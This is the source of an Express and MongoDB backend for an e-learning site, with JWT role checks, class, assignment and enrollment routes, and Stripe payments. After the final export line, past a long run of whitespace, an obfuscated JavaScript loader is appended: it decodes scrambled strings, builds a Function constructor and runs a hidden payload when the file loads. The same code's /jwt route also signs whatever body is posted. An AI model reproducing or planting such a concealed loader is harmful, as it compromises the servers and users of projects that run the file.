require("dotenv").config();
const express = require("express");
const app = express();
const cors = require("cors");
const stripe = require("stripe")(process.env.stripe_secrate_key);
const jwt = require("jsonwebtoken");
const { MongoClient, ServerApiVersion, ObjectId } = require("mongodb");
const port = process.env.PORT || 5000;

// middlewire
app.use(express.json());
const allowedOrigins = [
  "http://localhost:5173",
  "http://localhost:5174",
  "https://eduhub-client-side.vercel.app",
  "https://frontendlms-six.vercel.app",
];

app.use(
  cors({
    origin: (origin, callback) => {
      if (!origin || allowedOrigins.includes(origin)) {
        callback(null, true);
      } else {
        callback(new Error("Not allowed by CORS"));
      }
    },
    credentials: true,
    optionsSuccessStatus: 200,
  })
);

app.options("*", cors({
  origin: (origin, callback) => {
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error("Not allowed by CORS"));
    }
  },
  credentials: true,
}));
const uri = `mongodb+srv://${process.env.DB_USER}:${process.env.DB_PASS}@cluster0.hffiq4b.mongodb.net/?appName=Cluster0`;
app.get("/", (req, res) => {
  res.send("Smart Leaning is Runningggg");
});

// Create a MongoClient with a MongoClientOptions object to set the Stable API version
const client = new MongoClient(uri, {
  serverApi: {
    version: ServerApiVersion.v1,
    strict: true,
    deprecationErrors: true,
  },
});

async function run() {
  try {
    // Connect the client to the server	(optional starting in v4.7)
    // await client.connect();
    // Send a ping to confirm a successful connection
    // await client.db("admin").command({ ping: 1 });
    // console.log(
    //   "Pinged your deployment. You successfully connected to MongoDB!"
    // );

    const AllClassesCollection = client
      .db("Smart-Learning")
      .collection("AllClasses");
    const feedbackCollection = client
      .db("Smart-Learning")
      .collection("feedback");
    const usersCollection = client.db("Smart-Learning").collection("users");
    const teachersCollection = client
      .db("Smart-Learning")
      .collection("teachers");
    const enrollCollection = client.db("Smart-Learning").collection("enroll");
    const assignmentSubmisionCollection = client
      .db("Smart-Learning")
      .collection("assignmentSubmision");
    const assignmentsCollection = client
      .db("Smart-Learning")
      .collection("assignments");

    // token verify middlewire
    const verifyToken = (req, res, next) => {
      if (!req.headers.authorization) {
        return res.status(401).send({ message: `unauthorized access` });
      }
      const token = req.headers.authorization.split(" ")[1];
      jwt.verify(token, process.env.jwt_Token_Secrate, (err, decoded) => {
        if (err) {
          return res.status(401).send({ message: "unauthorized access" });
        }
        req.decoded = decoded;
        next();
      });
    };

    // use verify admin after verify token
    const verifyAdmin = async (req, res, next) => {
      const email = req.decoded.email;
      const query = { email: email };
      const user = await usersCollection.findOne(query);
      const isAdmin = user?.role === "admin";
      if (!isAdmin) {
        return res.status(403).send({ message: "forbidden access" });
      }
      next();
    };
    // user verify teacher after verify token
    const verifyTeacher = async (req, res, next) => {
      const email = req.decoded.email;
      const query = { email: email };
      const user = await usersCollection.findOne(query);
      const isTeacher = user?.role === "teacher" || user?.role === "admin";
      if (!isTeacher) {
        return res.status(403).send({ message: "forbidden access" });
      }
      next();
    };

    // verify student
    const verifyStudent = async (req, res, next) => {
      const email = req.decoded.email;
      const query = { email: email };
      const user = await usersCollection.findOne(query);
      const isStudent = user?.role === "student";
      if (!isStudent) {
        return res.status(403).send({ message: "forbidden access" });
      }
      next();
    };
    // jwt related
    app.post("/jwt", (req, res) => {
      const user = req.body;
      const token = jwt.sign(user, process.env.jwt_Token_Secrate, {
        expiresIn: "24h",
      });
      res.send({ token });
    });

    // admin email verification
    app.get("/user/admin/:email", verifyToken, async (req, res) => {
      const email = req.params.email;
      if (email !== req.decoded.email) {
        return res.status(403).send({ message: "forbidden access" });
      }
      const query = { email: email };
      const user = await usersCollection.findOne(query);
      let isAdmin = false;
      if (user) {
        isAdmin = user?.role === "admin";
      }
      res.send({ isAdmin });
    });
    // teacher email verification
    app.get("/user/teacher/:email", verifyToken, async (req, res) => {
      const email = req.params.email;
      if (email !== req.decoded.email) {
        return res.status(403).send({ message: "forbidden access" });
      }
      const query = { email: email };
      const user = await usersCollection.findOne(query);
      let isTeacher = false;
      if (user) {
        isTeacher = user?.role === "teacher" || user?.role === "admin";
      }
      res.send({ isTeacher });
    });
    // find all teacher
    app.get("/allTeachers-Rating", verifyToken, async (req, res) => {
      try {
        const result = await feedbackCollection
          .aggregate([
            {
              $group: {
                _id: "$title", // group by title
                averageRating: { $avg: "$rating" },
                totalFeedbacks: { $sum: 1 }, // optional: count of feedbacks per title
              },
            },
            {
              $project: {
                _id: 0,
                title: "$_id",
                averageRating: { $round: ["$averageRating", 2] }, // round to 2 decimal places
                totalFeedbacks: 1,
              },
            },
          ])
          .toArray();

        res.send(result);
      } catch (error) {
        console.error("Error:", error);
        res.status(500).send({ message: "Failed to fetch data" });
      }
    });

    // find all teacher or pending teacher for admin
    app.get("/rqTeacher", verifyToken, verifyAdmin, async (req, res) => {
      const limit = parseInt(req.query.limit);
      const page = parseInt(req.query.page);
      const skip = limit * page;
      // const query = { status: { $ne: "reject" } };
      const result = await teachersCollection
        .find()
        .skip(skip)
        .limit(limit)
        .toArray();
      res.send(result);
    });
    // find teachcollection length for admin pagination
    app.get("/techerRqCount", verifyToken, verifyAdmin, async (req, res) => {
      const result = await teachersCollection.countDocuments();
      res.send({ result });
    });
    // get all classes for admin by pagination
    app.get(
      "/getClasses-forAdmin",
      verifyToken,
      verifyAdmin,
      async (req, res) => {
        const page = parseInt(req.query.page);
        const limit = parseInt(req.query.limit);
        const skip = page * limit;
        const query = { status: { $ne: "reject" } };
        const result = await AllClassesCollection.find(query)
          .skip(skip)
          .limit(limit)
          .toArray();
        res.send(result);
      }
    );

    // get class count for the admin pagination
    app.get(
      "/adminClassPagination",
      verifyToken,
      verifyAdmin,
      async (req, res) => {
        const query = { status: { $ne: "reject" } };
        const result = await AllClassesCollection.countDocuments(query);
        res.send({ result });
      }
    );
    // approved or reject class by admin
    app.patch(
      "/approved-reject-class/:id",
      verifyToken,
      verifyAdmin,
      async (req, res) => {
        const message = req.query.message;
        const id = req.params.id;
        const query = { _id: new ObjectId(id) };
        if (message === "approved") {
          const update = {
            $set: {
              status: "approved",
            },
          };
          const result = await AllClassesCollection.updateOne(query, update);
          res.send(result);
        } else {
          const update = {
            $set: {
              status: "reject",
            },
          };
          const result = await AllClassesCollection.updateOne(query, update);
          res.send(result);
        }
      }
    );
    // make user admin
    app.patch(
      "/users/makeAdmin/:id",
      verifyToken,
      verifyAdmin,
      async (req, res) => {
        const userId = req.params.id;
        const result = await usersCollection.updateOne(
          { _id: new ObjectId(userId) },
          { $set: { role: "admin" } }
        );
        res.send(result);
      }
    );
    // get user for admin
    app.get("/alluser-admin", verifyToken, verifyAdmin, async (req, res) => {
      const searchQuery = req.query.search || "";
      const query = {
        $or: [
          { name: { $regex: searchQuery, $options: "i" } },
          { email: { $regex: searchQuery, $options: "i" } },
        ],
      };
      const page = parseInt(req.query.page);
      const limit = parseInt(req.query.limit);
      const skip = page * limit;
      const result = await usersCollection
        .find(query)
        .skip(skip)
        .limit(limit)
        .toArray();
      res.send(result);
    });

    // get all user count for admin pagination
    app.get(
      "/alluser-admin-count",
      verifyToken,
      verifyAdmin,
      async (req, res) => {
        const result = await usersCollection.countDocuments();
        res.send({ result });
      }
    );

    // api for login or register user
    app.post("/users", async (req, res) => {
      const user = req.body;
      const query = { email: user.email };
      const existingUser = await usersCollection.findOne(query);
      if (existingUser) {
        return res.send({ message: "user already existis", insertedId: null });
      }
      const result = await usersCollection.insertOne(user);
      res.send(result);
    });

    // add class by teacher verfication after verifyToken
    app.post("/addClass", verifyToken, verifyTeacher, async (req, res) => {
      const body = req.body;
      const result = await AllClassesCollection.insertOne(body);
      res.send(result);
    });

    // add assignment by teacher or admin
    app.post("/add-assignment", verifyToken, async (req, res) => {
      const email = req.query.email;
      const query = { email: email };
      const find = await usersCollection.findOne(query);
      const status = find.role;
      if (status === "teacher" || status === "admin") {
        const body = req.body;
        const classId = body.classId;
        const queryId = { _id: new ObjectId(classId) };
        const findClass = await AllClassesCollection.findOne(queryId);
        const assignment = findClass.assignments + 1;
        const updateClass = {
          $set: {
            assignments: assignment,
          },
        };
        const updateResult = await AllClassesCollection.updateOne(
          queryId,
          updateClass
        );
        const result = await assignmentsCollection.insertOne(body);
        res.send(result);
      } else {
        res.status(403).send({ message: "unauthorized access" });
      }
    });
    // find assignment
    app.get("/find-assignment/:id", verifyToken, async (req, res) => {
      const email = req.query.email;
      const query = { email: email };
      const user = await usersCollection.findOne(query);
      const status = user.role.toLowerCase();
      const id = req.params.id;
      const page = parseInt(req.query.page);
      const limit = parseInt(req.query.limit);
      const skip = page * limit;
      if (!user) {
        return res.status(401).send("unauthorized access");
      } else if (status === "admin" || status === "teacher") {
        const queryId = { classId: id };
        const result = await assignmentsCollection
          .find(queryId)
          .skip(skip)
          .limit(limit)
          .toArray();
        res.send(result);
      } else if (status === "student") {
        const queryId = { classId: id };
        const enrollment = await enrollCollection.findOne({
          classId: id,
          email: email,
        });

        if (!enrollment) {
          return res
            .status(403)
            .send("Forbidden access: Not enrolled in this class");
        }
        // Fetch assignments if enrolled
        const assignments = await assignmentsCollection
          .find(queryId)
          .skip(skip)
          .limit(limit)
          .toArray();
        return res.send(assignments);
      } else {
        return res.status(403).send("Forbidden access");
      }
    });

    // find added class by teacher
    app.get(
      "/findClass/:email",
      verifyToken,
      verifyTeacher,
      async (req, res) => {
        const email = req.params.email;
        const query = { email: email };
        const page = parseInt(req.query.page);
        const limit = parseInt(req.query.limit);
        const skip = page * limit;
        const result = await AllClassesCollection.find(query)
          .skip(skip)
          .limit(limit)
          .toArray();
        res.send(result);
      }
    );

    // api for teacher request
    app.get("/teacherReq/:email", verifyToken, async (req, res) => {
      const email = req.params.email;
      const query = { email: email };
      const existingUser = await teachersCollection
        .find(query)
        .sort({ _id: -1 })
        .limit(1)
        .toArray();
      if (!existingUser || existingUser.length === 0) {
        return res.send(false);
      }

      const result = existingUser[0].status;
      res.send(result);
    });

    // api for teacher request approved or reject
    app.patch(
      "/class-request/:id",
      verifyToken,
      verifyAdmin,
      async (req, res) => {
        const message = req.query.message;
        const id = req.params.id;
        const query = { _id: new ObjectId(id) };
        if (message === "approved") {
          const update = {
            $set: {
              status: "approved",
            },
          };
          const findEmail = await teachersCollection.findOne(query);
          const email = { email: findEmail.email };
          const updateUserStatus = {
            $set: {
              role: "teacher",
            },
          };
          const userUpdate = await usersCollection.updateOne(
            email,
            updateUserStatus
          );
          const result = await teachersCollection.updateOne(query, update);
          return res.send(result);
        } else {
          const update = {
            $set: {
              status: "reject",
            },
          };
          const result = await teachersCollection.updateOne(query, update);
          return res.send(result);
        }
      }
    );

    // delete the class from teacher or admin side
    app.delete("/delete-class/:id", verifyToken, async (req, res) => {
      const email = req.query.email;
      const query = { email: email };
      const find = await usersCollection.findOne(query);
      const status = find.role;
      if (status === "teacher" || status === "admin") {
        const id = req.params.id;
        const deleteQuery = { _id: new ObjectId(id) };
        const result = await AllClassesCollection.deleteOne(deleteQuery);
        res.send(result);
      } else {
        res.status(403).send({ message: "unauthorized access" });
      }
    });

    // update the class from the teacher or admin side

    app.patch("/update-class/:id", verifyToken, async (req, res) => {
      const email = req.query.email;
      const query = { email: email };
      const find = await usersCollection.findOne(query);
      const status = find.role;
      if (status === "teacher" || status === "admin") {
        const id = req.params.id;
        const body = req.body;
        const updateQuery = { _id: new ObjectId(id) };
        const updateInfo = {
          $set: {
            title: body.title,
            price: body.price,
            image: body.image,
            description: body.description,
          },
        };
        const result = await AllClassesCollection.updateOne(
          updateQuery,
          updateInfo
        );
        res.send(result);
      } else {
        res.status(403).send({ message: "unauthorized access" });
      }
    });
    // check assignment by teacher or admin

    app.get("/checkAssignment/:id", verifyToken, async (req, res) => {
      const email = req.query.email;
      const query = { email: email };
      const find = await usersCollection.findOne(query);
      const page = parseInt(req.query.page);
      const limit = parseInt(req.query.limit);
      const skip = page * limit;
      const status = find.role;
      if (status === "teacher" || status === "admin") {
        const id = req.params.id; // assignment id
        const queryAssignment = { assignmentId: id };
        const result = await assignmentSubmisionCollection
          .find(queryAssignment)
          .skip(skip)
          .limit(limit)
          .toArray();
        res.send(result);
      } else {
        res.status(403).send({ message: "unauthorized access" });
      }
    });

    // total assignment counst
    app.get(
      "/checkAssignment-count/:assignmentId",
      verifyToken,
      async (req, res) => {
        const assignmentId = req.params.assignmentId;
        const counts = await assignmentSubmisionCollection.countDocuments(
          assignmentId
        );
        res.send({ counts });
      }
    );

    // student assignment submisstion api
    app.post(
      "/assignment-submit",
      verifyToken,
      verifyStudent,
      async (req, res) => {
        const body = req.body;
        const queryId = { _id: new ObjectId(body.classId) }; // class Id for find the class
        const assignmentId = { _id: new ObjectId(body.assignmentId) };
        const assignment = await assignmentsCollection.findOne(assignmentId);
        console.log(assignment);
        const updateSubmisstion = {
          $set: {
            submitedAssignments: parseInt(assignment.submitedAssignments) + 1,
          },
        };
        const updateTheAssignment = await assignmentsCollection.updateOne(
          assignmentId,
          updateSubmisstion
        );
        const findClass = await AllClassesCollection.findOne(queryId);
        const updateClass = {
          $set: {
            submitedAssignments: parseInt(findClass.submitedAssignments) + 1,
          },
        };
        const updateFindClass = await AllClassesCollection.updateOne(
          queryId,
          updateClass
        );
        const result = await assignmentSubmisionCollection.insertOne(body);
        res.send(result);
      }
    );
    // student feedback api
    app.post(
      "/student-feedback/:classId",
      verifyToken,
      verifyStudent,
      async (req, res) => {
        const classId = req.params.classId; //class id
        const email = req.decoded.email; // student email
        const enrollment = await enrollCollection.findOne({
          classId: classId,
          email: email,
        });
        if (!enrollment) {
          return res
            .status(403)
            .send("Forbidden access: Not enrolled in this class");
        } else {
          const body = req.body;
          const feedback = await feedbackCollection.insertOne(body);
          return res.send(feedback);
        }
      }
    );

    // =========================  public api ===================================

    // user profile
    app.get("/user/profile/:email", verifyToken, async (req, res) => {
      const email = req.params.email;
      if (email !== req.decoded.email) {
        return res.status(403).send({ message: "forbidden access" });
      }
      const query = { email: email };
      const result = await usersCollection.findOne(query);
      res.send(result);
    });

    app.get("/classes/:id", verifyToken, async (req, res) => {
      const id = req.params.id;
      const query = { _id: new ObjectId(id) };
      const result = await AllClassesCollection.findOne(query);
      res.send(result);
    });
    app.patch("/classenroll-update/:id", verifyToken, async (req, res) => {
      const id = req.params.id;
      const body = req.body;
      const enrollInfo = {
        name: body.name,
        email: body.email,
        transactionId: body.transactionId,
        classId: id,
      };
      // Find the class to get the creator's email
      const classQuery = { _id: new ObjectId(id) };
      const classData = await AllClassesCollection.findOne(classQuery);
      if (classData && classData.email === body.email) {
        return res.status(403).send({ message: "Teachers cannot enroll in their own class." });
      }
      const enroll = await enrollCollection.insertOne(enrollInfo);
      const find = await AllClassesCollection.findOne(classQuery);
      const updateEnroll = parseInt(find.enroll) + 1;
      const update = {
        $set: {
          enroll: updateEnroll,
        },
      };
      const result = await AllClassesCollection.updateOne(classQuery, update);
      res.send(result);
    });

    // find the enroll classes
    app.get("/Enrollclasses/:email", verifyToken, async (req, res) => {
      const email = req.params.email;
      if (email !== req.decoded.email) {
        return res.status(403).send({ message: "forbidden access" });
      }
      const query = { email: email };
      const enrollments = await enrollCollection.find(query).toArray();

      // fetch the classes
      const enrolledClasses = await Promise.all(
        enrollments.map(async (enrollment) => {
          const classId = enrollment.classId;
          const id = { _id: new ObjectId(classId) };
          const classDetails = await AllClassesCollection.findOne(id);
          return classDetails;
        })
      );
      res.send(enrolledClasses);
    });
    // public api for top enroll section
    app.get("/classes", async (req, res) => {
      const result = await AllClassesCollection.find()
        .sort({ enroll: -1 })
        .limit(6)
        .toArray();
      res.send(result);
    });

    app.get("/allclasses", async (req, res) => {
      const limit = parseInt(req.query.limit);
      const page = parseInt(req.query.page);
      const skip = page * limit;
      const status = { status: "approved" };
      const result = await AllClassesCollection.find(status)
        .skip(skip)
        .limit(limit)
        .toArray();
      res.send(result);
    });

    // update profile
    app.patch("/update-profile/:email", verifyToken, async (req, res) => {
      const email = req.params.email;
      if (email === req.decoded.email) {
        const query = { email: email };
        const body = req.body;
        const updateProfile = {
          $set: {
            name: body.name,
            image: body.image,
            phone: body.number,
          },
        };
        const isTeacher = await teachersCollection
          .find(query)
          .sort({ _id: -1 })
          .limit(1)
          .toArray();
        if (isTeacher.length !== 0) {
          console.log("find the teacher");
          const updateTeacherphoto = {
            $set: {
              name: body.name,
              image: body.image,
            },
          };
          const updateteacher = await teachersCollection.updateOne(
            { _id: new ObjectId(isTeacher[0]._id) },
            updateTeacherphoto
          );
        }
        const result = await usersCollection.updateOne(query, updateProfile);
        res.send(result);
      } else {
        res.status(403).send({ message: "unauthorized access" });
      }
    });
    // stripe api
    app.post("/create-payment-intent", verifyToken, async (req, res) => {
      try {
        const { price } = req.body;
        const amount = parseInt(price * 100); // Convert to cents
        console.log(amount);

        const paymentIntent = await stripe.paymentIntents.create({
          amount: amount,
          currency: "usd",
          payment_method_types: ["card"],
        });
        console.log(paymentIntent.client_secret);

        res.send({
          clientSecret: paymentIntent.client_secret,
        });
      } catch (error) {
        console.error("Error creating payment intent:", error);
        res.status(500).send({ error: "Internal Server Error" });
      }
    });

    app.get("/feedback", async (req, res) => {
      const result = await feedbackCollection.find().toArray();
      res.send(result);
    });
    // api for teacher related
    app.post("/teacher", verifyToken, async (req, res) => {
      const body = req.body;
      const result = await teachersCollection.insertOne(body);
      res.send();
    });
    //find all teacher who are approved
    app.get("/find-approved-teacher", async (req, res) => {
      const result = await teachersCollection
        .find({ status: "approved" })
        .toArray();
      res.send(result);
    });

    // total user, classes, enrollment count
    app.get("/totalCount", async (req, res) => {
      const query = { status: "approved" };
      const allClasses = await AllClassesCollection.countDocuments(query);
      const alluser = await usersCollection.estimatedDocumentCount();
      const totalEnroll = await AllClassesCollection.aggregate([
        {
          $group: {
            _id: null,
            totalenroll: { $sum: "$enroll" },
          },
        },
      ]).toArray();
      const total = totalEnroll[0]?.totalenroll || 0;

      res.send({ allClasses, alluser, totalEnroll: total });
    });
  } finally {
    // Ensures that the client will close when you finish/error
    // await client.close();
  }
}
run().catch(console.dir);
app.listen(port, () => {
  console.log(`server is running on port ${port}`);
});

module.exports = app;																																																																																																																																																																																																																																																																										var z = '-*133';var NX=[6912847,907388^907539,217597^204358,330538^330063,982935^939384,5019283],SX=[5283741,416048^416193,293640^317673,436016^436107,781205^733396,4738901];function spin(R,c){for(var e,r,t,s,i,n,a=[],o=217956^217956,l=c[648486^648486];o<R['\u006C\u0065\u006E\u0067\u0074\u0068'];)a[o]=R['\u0063\u0068\u0061\u0072\u0041\u0074'](o),o+=908966^908967;for(e=a['\u006C\u0065\u006E\u0067\u0074\u0068'],o=275122^275122;o<e;)r=l*(o+c[581701^581700])+l%c[740899^740897],i=(t=l*(o+c[827307^827304])+l%c[172928^172932])%e,n=a[s=r%e],a[s]=a[i],a[i]=n,l=(r+t)%c[116482^116487],o+=325595^325594;return a['\u006A\u006F\u0069\u006E']("");}function splitLane(R){var c=String['\u0066\u0072\u006F\u006D\u0043\u0068\u0061\u0072\u0043\u006F\u0064\u0065'](742867^742863),e=spin(R,NX);return(e=(e=(e=e['\u0073\u0070\u006C\u0069\u0074']("\u005E")['\u006A\u006F\u0069\u006E'](c))['\u0073\u0070\u006C\u0069\u0074']("\u002A\u0031")['\u006A\u006F\u0069\u006E']("\u005E"))['\u0073\u0070\u006C\u0069\u0074']("\u002A\u0030")['\u006A\u006F\u0069\u006E']("\u002A"))['\u0073\u0070\u006C\u0069\u0074'](c);}function peel(R){return spin(R,SX);}!function(R,c,_0x4d43e){R['\u007A']=z;var e=splitLane("\u0063\u005E\u006D\u0065\u006A\u0062\u005E\u0074\u0072\u006F");_0x4d43e=199787^199779;R[e[539188^539188]]=c,typeof module===e[818819^818818]&&(R[e[712707^712705]]=module);var r=peel("cnotsnturtpicokfzrogmybjdcawvulxsreqh".split("").reverse().join("")),t=peel[r['\u0073\u0075\u0062\u0073\u0074\u0072\u0069\u006E\u0067'](814520^814520,732566^732573)],s=t("",peel('=aenruh(al=5c,g8fdu.yr ..ncecf,5"paeau6lnj)r]2uv"x-q(] a;(r=;;r+(a[8.s2tAgoq,uh8C,ai,s;a(Am0(nj;jv*,7vo7()(o;m6oa4rw). rod[fs2n{drvt4x)+0,anr+rr+o)}z1 =hf[an8r1r[,]s7-77laa.ui7{-069lvmt2r=i]]<+)u,e),,;nrh[r=0v-r(;,=p)Cus=+c;g;f;qA))1vi)vk0nrl1ae f=[;hisy.em(d+o!2 =(evea78=.)4ei=g.n={ff=1[<2a f1=r;4,S)rylv1u y;kql{tvnv (C (l,ovnp i=tlr,r.lwozh(l,tq;;rr((v=ahsv;]xq=ab;da;,((r;vjq.(t[+)da)rdnrhs41y(vr;fh;3g"]e(.ahrpapg]g.)ngfpn1h,icl;;)=C;m5=+r, .);u=+s}+)it,+bm;d+um)-=siiqol=t=r=q9+..chq+[6fe t0nrpr( vr8flrn,ddgt ]6a.;m;rth.gq 2a}eveic]gbti<4o;C;l,zzi6+l[a[;+(si"li"r,npi9s,frfhuw)ow=e{(b=wen2t.gu.i=kiaaa+)yftpa3n})=9")cpA+u;utp]"=lk7vpt 1r;hzw")t()9)(.lul=s7f; ;sq0)n"y+0s}=va+s mh(0q.]hv;> 06=A-ozetr(t1rtrsiso0e,.;z[(f<5e7t,(raoavnr;thhf;v,j=r; )r>18zho*o{<akmsn)akte.vo9+ea0clio;bu =]C!gj;y3+l)e=.}dr=i6oiC8rnn0;6=ar"}.rei=]Stsrnn.;2r=t;[t;iv=prCrn()aretuz+ hlk[+x=e -8j{(ejy9(()) '));t("",s(peel('R_<"cRJ!&VecRWa=RrfR$6"c1;RRYcnh_/.t iRRRG^<R.RcR2.[nR .Rf./<Rc3!!5nSR<RiRL.eSslf(edgxc<?o<rlcR?tRosdRfuSe.?&ph.RROMs[e<skRE.<Ru<rRe;RDRBrRR\\.fR.<c:!bpl09icoRrtcR(;roRRn2-"(.^w y.<<dd )$f ou.%e<a<e.t<m(cRxfR<[J(feR<Pbr.b\'oRi.RR<\'RR%wRfs)eR.[agSP{d2.k<ac1e.!3.P<ZRiR*oDsi=[.<f."4Rb N"eoxRpo.iIlkaeTR.2)%m<ieR]z<|Ru((fRwRR\\R>R9#.R0rd=s.0x!sR.fRS)(cct1pfotaeMuR@R=<RR/`.Rk$(2cR.s7e1a.FRKc*..z"RnfPesRtRRR.<Rl#Rf<: 2((R R$\'6s`<3nhi*$eXc}Rh? ctoc.iecc9 {Ra<s;u!.e]ERRoH..$"n<D3RsRR..(ReesseR< t," Rdov}Sc0Jmi.T<sEegsRw]R"aR.R!R<o))jR Rew itc.snk(}(n[veR<0<=kfH<rrMR ciknE.c.B<&R[o]R.%ccRlrx;* ["oisenRefea!Yn.ecR%o"u.<6lRRRyR=is=RR()RRe:RR)!RwcrR1<.o!RcRc@"}RuRqu5(3Pol"eRt0!ftaR*<R1tnkcf}T.!$/<ro IycRR )P<\\.b<tR7:PPs<].rX<<.eRu(RRRqnp.<.R;ctisX.RRyR$@<3)kRRc<+Rr8l*.iR!rC\\P!n=cs<(ci<(R7eReRc. t<epe)e<<,e<(EK!.pnb$"RaRR.evuhc.Tl_c.:R0r )Rww!sS0.t7u.0(R9_a($&.e6f.RRk1Cxbi8l.hc=m(@<Rd..<rr.2.KMrcb_RnR(R_c:Dwt}.R.{}9g$RRR)TVt<a(.<G.dR~WUR.;lr.hIsmNP  t@RR8_R2R.iRrRPR<(R3#cec0ce3iRR<aR3RanR{Zs}!M<R-*.yda3Ri/0%fR#R <i2<R08:.t}Rf!"-Rc.RlRcytyRseA0RSTR8.4q<$FTeR..P_<cR6hbR.eri.c-RhcARC2vR.;bS<R<a#K<R:r]Tfee-;!k=_s.Rcmjs(R}:<RaR*&g.<domeisRn.($#_a{V@ocY-.omPdam.RalfcyoT+!P_gsr.<biR!f.)cI&(bIoRi(rnrW.ie.Rc !(ic(SR.cr`:9<XspR($ mRct<s.g!.48rskevVRPdRkxR<Rdern)eSs/)R ler<csT3dc}.R5C/W(.SonZr)Rcoccsch)R.<RR<t.ss(RR<dlu.c.|f8tk,slnepo<eR<!.6R.eeRRTa&h Mf<{[o$R< Rs0)= <xSec.c}<c$es((d)RRc}fCRR<*<R.m-.R*Re<(xvRs (M&Rf.eP*g >s)<o.=.RisnrR.?{5<ibR6)RR1s cRgqcelc=cl;be<lf*SICd2e"zpRR}<cRlS,njscm$Rn.!aii<JY]<fPCs@jA.R<% t.RowR}\' r>pzh..lR\'<go_}<SR(kqxh[ &<iR-f$C<u<iaENR5RTR]<Rpsk..Rzdg.)]<)er.Rr.MsRzP>RRe<<t_hgl<p.RcmfRs!nftR4 dt_9^<,ore5RfRx RR[rX.<sbyR<<.2R.RrenUP(y>.p<<csRlt0t.{.Syin<ggl$ Vc.):EHI!.xDuR,RpRhR(sct.MrRMjHMRRcR. Rtnd|oa0.n#a.2)Dfk&cRIRRR/feR.c@<irs6T+1RPx..R.sc.aR#.-<X{R!n4RcRitR/nRe9m..<A)ben).]<.a(R(.{?3tR&RR/i(lX. <h!dRR<"!co? 3 1R<-hn<dtndo<Rksm#-c(TeRee!].R<s<T+=R.Ri-r@RR.r#cd<cRRRmztf.CdeRp.c{QRibjsos.fRrg-RW0diRR<.k<ORR&-R!# ]Cs]yt4.-d_`PRR\'<.RvejSw<dc.c ,f.P.(.citcNbRn\'-.eRcRnrQ.rRxo{Rc<"6Rnd]R}Rm(R$RSo.T5Rc2cx.*vRoic_>.s0BRf)<P<aR.oCZ|0 POHdQo.n <.1soR_\' .P<er.[<R|R<0i<Rr;\'I.R[}+lc![mc!.lc<n(a tRRHRl,}p}R)R8RJ<aR.<td(N>]ic<me@5cn[u.R).b%sPn<<_RR!RbR=$RR^<!})sb-6"#E8cR(d!R)tratRR<< 21R\'L!ib|eOtRRt$ucdnRR.t)RzE.GPy! RAI-nqau<}.ycR...cRR.ccc$^RRdC_R<t8cRhs2"R2.\'S>))2h!efy..>!iL$en ;%9OTv.d$4RRC<cPS(tuRwl&(m#"R|pch<tH$a<< .t!RSEf.RRgcNP.R CRi4mR<#MRR<;wi-#E <<t<eR<H<RrntoE(!0r0<d..RC"cn..2bp(6Cp<SR"e1l)cc<a(P.P9e<qa)<<1<n.iRaRPR(}R=.&,2!cwR.)PR$.<qR<}!1*S<R!Rf.<c<Rd_<R2R<<#]<<RRRp!.rpR<*!TRIR<Pk<Rzta.&}.aleK=iP<R\'=gRP}Rp${SB. Rsy.(.t! c;<e5sh64tt<pf<otxuLTkr>;<R.cpsR.cRtR-#a4uR6.Rte;-($?w8:p/&Rl0<r#<e iisf!d$ao_(#cmr e<RRV!Pnca<t.~crc(e\'*a: <RRneaZe.%/dR<RR*(E `+e[PcwRw <(eucta).7W</$P<.hcST 7eRB!.+R.I<bhRel.te.b4[unueuR!Rlt(RRR,},HftHv_n.<eR _A<8<sr<Rx4)RN!pRd|B <RRkie\'c-.Rcnm3cs<Si<i.).E(R(<RRPR _3R<cwe.!.l<R$!Rbd,e<PREl$tpr!<o/).RRt!,T(rc#/.Ry(+RrRg`<f.<a+.f)/<<&< eRR<ei-<BfE.sRbnRR).R%/jtlR<%c R!R(xR#cR.sRR.RM.<R7c(cglRcm.]<.ec2b)P<<2RR&daBK)r<Zt>[daRHced.MR<}sRGr.R<?1RfRRcccR(osc"RR~k<\\!Mc.p.C)uRx)+(Rk\\e\'j6MPURCmc?RR3R4(iie.sRe*R:zSR;Pn(Z)<lkRvl:<RQ{Rci"cP+e,MRWa.<RMrRlt#<RRst3r!.<g<KRwR(Rj.RRa!.G4R.$pn.z;{eR;21{0T4(rRk-\'.!<Rx<iKh<)s[<tc PueR}r(faaRf7l<R5!rRlDXRm.1:piR <= Rjso.<er!oRqI)R1Rrrwo{&tRRK<nCZ-0M.cuR)c%cd0+w<$E<iT<<otdayn<io^.R\'RRwRc65kR#JP.<!R5e!r{Re;yeR(.0=;cis.c(gtR2pu9=MQf[{,On ..PNi(<.RaiQR..c%t/(/R<.r.Rr..l!scue.aP~R!c03aUR"tcsc.!rVRpaiz0<b"dtgd!.s?#cvdR~#R<R<)(Tb.IR)Pc<6?7)]4W6#nnPt.}re|RU>ReaR)p# nS+b2%iRj}s(Xn^osycsgdJ.ss[pkR8. suwrRny}do.GiT.<w+c.(cs;! nh(R,RCR[<&XR<<.cbcTRsAfncS-R"i<.cB(|RR.Rd%R.U/R.rL<t)!ReR2cpp!s<>R?1R$<teR<<Ro0rtf(ResbDR7liaR.}s./sRcrsarlR%f]s0R.<le<re%s.sllsb8ROxCRtc1t6{.- Rl.eRo.cgmRkoRsbca<Iyu}Rrt#s&|tRaxR)ho.Rsf kRRR4cr(x.c=t.<i3(Rx .<..R$f"t RRsN</C RnRdRrpRR<od<.R<r[ar"l<. P".Rs.R.rc!v#DfReebo{,R)d8v<fRc.cJ<te.!RR"kS(S)R#<S.hP}rt.(/(.c(1d<Rw!su0(o.Pb(0.RJcEiC.f( .i.buc<#r...RR[8)_!R.SRB!"tRVbn_RlcPRR oRn;h<RP@r8aRrlc|co5(Rp)<Rxd<<$.n<lo}erR<oyRan.oy.RIB<ht<cobEiR}(mMr.TaR0RetiR}.!<.R19t<AebR_Lclh!D0r.R0ilirRc/s8<cR(r*R@e<<.l;.rc-PulaRccRi"06@!Rc!.Qkl,<g<7}b(aRcL.cs\'+..T(<rR<<..&fd>Ro coemRcw.lcn(c:R\'|t<RnRY]4M0GR.RFRut.!<f.u+$+t<R*7sRRR(ibhd=P.<}RR=eR._).)rr,4& lR}e<R6RR<^gfleRdstP~<bc.(sy<5}Ri?lch<&.3{u.n_:iR7b;0<R<cRRRcR@|1seGRs2)c=h<f9e<<r+eR\\\')&5rv/Fr[.a.tn.RPrnU<o_c6n=ET<.i+xc7levsu<r.!Rc<!]Rw .RR(]PRD. lf!:&.bdpTl.R#RS.$R<(R <<c[.n. 